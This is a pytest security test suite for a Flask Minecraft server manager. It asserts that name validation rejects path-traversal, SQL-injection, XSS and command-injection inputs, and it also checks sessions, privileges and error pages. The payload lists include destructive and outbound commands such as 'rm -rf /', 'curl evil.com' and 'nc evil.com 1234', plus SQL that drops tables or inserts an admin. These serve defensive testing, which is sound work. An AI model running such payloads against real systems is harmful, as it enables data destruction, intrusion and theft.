"""
Security-focused tests for the Minecraft Server Manager.
"""
import os
from unittest.mock import MagicMock, patch

from app.extensions import db
from app.models import User
from app.utils import is_valid_server_name


class TestSecurityVulnerabilities:
    """Test for common security vulnerabilities."""

    def test_path_traversal_server_name(self):
        """Test that server names cannot be used for path traversal."""
        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "../config",
            "..\\config",
            "normal/../../../etc/passwd",
            "normal\\..\\..\\..\\windows",
            "..",
            ".",
            "....",
            "../",
            "..\\",
            "/root",
            "\\root",
            "~/../../etc/passwd",
            "$HOME/../../../etc/passwd",
        ]

        for name in malicious_names:
            assert not is_valid_server_name(
                name
            ), f"'{name}' should be rejected for security"

    def test_sql_injection_username(self, client, app):
        """Test that usernames are protected against SQL injection."""
        sql_injection_attempts = [
            "admin'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "admin' OR 1=1 --",
            "admin'; INSERT INTO users (username, password_hash, is_admin) "
            "VALUES ('hacker', 'hash', 1); --",
            "admin' UNION SELECT * FROM users --",
            "'; UPDATE users SET is_admin=1 WHERE username='testuser'; --",
        ]

        for malicious_username in sql_injection_attempts:
            response = client.post(
                "/login",
                data={"username": malicious_username, "password": "anypassword"},
            )

            # Should not crash and should return invalid login
            assert response.status_code == 200
            assert b"Invalid username or password" in response.data

            # Verify no unauthorized users were created or modified
            with app.app_context():
                users = User.query.all()
                # Should only have the default admin user (if any)
                for user in users:
                    assert user.username in ["admin"]  # Only expected users

    def test_xss_in_server_name_display(self, authenticated_client, app):
        """Test that server names are properly escaped in templates."""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src='x' onerror='alert(1)'>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "' onmouseover=alert('xss') '",
            "\"><script>alert('xss')</script>",
        ]

        for xss_payload in xss_attempts:
            # These should be rejected by server name validation
            assert not is_valid_server_name(
                xss_payload
            ), f"XSS payload '{xss_payload}' should be rejected"

    def test_command_injection_server_operations(
        self, authenticated_client, app, test_server
    ):
        """Test that server operations are protected against command injection."""
        # Test with malicious server name that could be used in command injection
        malicious_names = [
            "test; rm -rf /",
            "test && curl evil.com",
            "test | nc evil.com 1234",
            "test`whoami`",
            "test$(whoami)",
            "test;cat /etc/passwd",
            "test & ping evil.com",
        ]

        for name in malicious_names:
            # These should be rejected by validation
            assert not is_valid_server_name(
                name
            ), f"Command injection payload '{name}' should be rejected"

    def test_directory_traversal_in_paths(self, authenticated_client, app):
        """Test that file operations are protected against directory traversal."""
        # This test ensures that server directories are properly contained
        with patch("os.makedirs") as mock_makedirs, patch(
            "app.routes.server_routes.find_next_available_port"
        ) as mock_port, patch(
            "app.routes.server_routes.get_version_info"
        ) as mock_version, patch(
            "requests.get"
        ) as mock_requests, patch(
            "subprocess.Popen"
        ) as mock_popen:
            mock_port.return_value = 25565
            mock_version.return_value = {
                "downloads": {"server": {"url": "http://example.com/server.jar"}}
            }
            mock_response = MagicMock()
            mock_response.iter_content.return_value = [b"fake jar"]
            mock_requests.return_value = mock_response
            mock_process = MagicMock()
            mock_popen.return_value = mock_process

            # Try with a "normal" looking name that contains path traversal
            response = authenticated_client.post(
                "/configure_server",
                data={
                    "server_name": "normal-name",  # This should work
                    "level_seed": "",
                    "gamemode": "survival",
                    "difficulty": "normal",
                    "motd": "Test",
                },
                query_string={"version_type": "release", "version": "1.20.1"},
            )

            if mock_makedirs.called:
                # Verify the path doesn't escape the servers directory
                called_path = mock_makedirs.call_args[0][0]
                assert called_path.startswith(
                    "servers/"
                ), f"Path '{called_path}' should be contained in servers directory"
                assert (
                    "../" not in called_path
                ), f"Path '{called_path}' should not contain ../"
                assert (
                    ".." not in called_path
                ), f"Path '{called_path}' should not contain .."

    def test_file_upload_restrictions(self):
        """Test that file operations have proper restrictions."""
        # This is more of a design test - ensuring we don't have unrestricted
        # file uploads
        # The application should only allow specific file operations in
        # specific directories

        # Verify server files are contained
        server_name = "testserver"
        expected_server_dir = os.path.join("servers", server_name)

        # The path should be predictable and contained
        assert not expected_server_dir.startswith("/")  # Should be relative
        assert "../" not in expected_server_dir  # Should not escape
        assert expected_server_dir.startswith("servers/")  # Should be in servers dir

    def test_session_security(self, client, app):
        """Test session security measures."""
        with app.app_context():
            # Create test user
            user = User(username="testuser", password_hash="test_hash", is_admin=False)
            db.session.add(user)
            db.session.commit()

            # Test that sessions are invalidated on logout
            with client.session_transaction() as sess:
                sess["_user_id"] = str(user.id)
                sess["_fresh"] = True

            # Verify user is logged in
            response = client.get("/")
            assert response.status_code == 200  # Should access home page

            # Logout
            client.get("/logout", follow_redirects=True)

            # Verify user is logged out
            response = client.get("/")
            assert response.status_code == 302  # Should redirect to login

    def test_admin_privilege_escalation(self, client, app):
        """Test that regular users cannot escalate to admin privileges."""
        with app.app_context():
            # Create regular user
            user = User(
                username="regularuser", password_hash="test_hash", is_admin=False
            )
            db.session.add(user)
            db.session.commit()

            # Simulate login
            with client.session_transaction() as sess:
                sess["_user_id"] = str(user.id)
                sess["_fresh"] = True

            # Try to access admin-only functionality
            response = client.get("/add_user", follow_redirects=True)
            # Check for flash message about admin privileges required
            assert b"Admin privileges required" in response.data

            # Verify user is still not admin
            user = User.query.filter_by(username="regularuser").first()
            assert user.is_admin is False

    def test_password_hash_security(self, app):
        """Test that passwords are properly hashed."""
        with app.app_context():
            from werkzeug.security import check_password_hash, generate_password_hash

            password = "testpassword123"
            hash1 = generate_password_hash(password)
            hash2 = generate_password_hash(password)

            # Hashes should be different (salted)
            assert hash1 != hash2

            # But both should verify the password
            assert check_password_hash(hash1, password)
            assert check_password_hash(hash2, password)

            # Wrong password should not verify
            assert not check_password_hash(hash1, "wrongpassword")

    def test_process_security(self, authenticated_client, app, test_server):
        """Test that server processes are started securely."""
        # Create EULA file
        server_dir = f"servers/{test_server.server_name}"
        os.makedirs(server_dir, exist_ok=True)
        eula_path = os.path.join(server_dir, "eula.txt")

        try:
            with open(eula_path, "w") as f:
                f.write("eula=true\n")

            with patch("subprocess.Popen") as mock_popen:
                mock_process = MagicMock()
                mock_process.pid = 12345
                mock_popen.return_value = mock_process

                response = authenticated_client.post(f"/start/{test_server.id}")

                if mock_popen.called:
                    # Verify the command doesn't contain shell injection
                    args = mock_popen.call_args[0][0]

                    # Should be a list (not shell=True)
                    assert isinstance(
                        args, list
                    ), "Command should be passed as list to prevent shell injection"

                    # Should not contain suspicious characters
                    command_str = " ".join(args)
                    dangerous_chars = [";", "&", "|", "`", "$", "<", ">", "(", ")"]
                    for char in dangerous_chars:
                        assert (
                            char not in command_str
                        ), f"Command should not contain '{char}'"
        finally:
            # Cleanup
            import shutil

            shutil.rmtree(server_dir, ignore_errors=True)

    def test_information_disclosure(self, client):
        """Test that sensitive information is not disclosed in error messages."""
        # Test with various invalid inputs to ensure no sensitive info is leaked

        # Invalid login should not reveal if username exists
        response = client.post(
            "/login", data={"username": "nonexistent", "password": "wrongpass"}
        )
        assert b"Invalid username or password" in response.data
        # Should not say "user not found" vs "wrong password"

        # Access to non-existent server should return 404, not reveal server list
        response = client.get("/start/999")
        assert response.status_code in [302, 404]  # Redirect to login or 404

        # Error pages should not reveal system information
        response = client.get("/nonexistent-page")
        assert response.status_code == 404
        # Should not contain system paths, Python version, etc.
        response_text = response.data.decode("utf-8").lower()
        sensitive_info = [
            "/home/",
            "/usr/",
            "/var/",
            "python",
            "flask",
            "werkzeug",
            "traceback",
        ]
        for info in sensitive_info:
            assert info not in response_text, f"Response should not contain '{info}'"
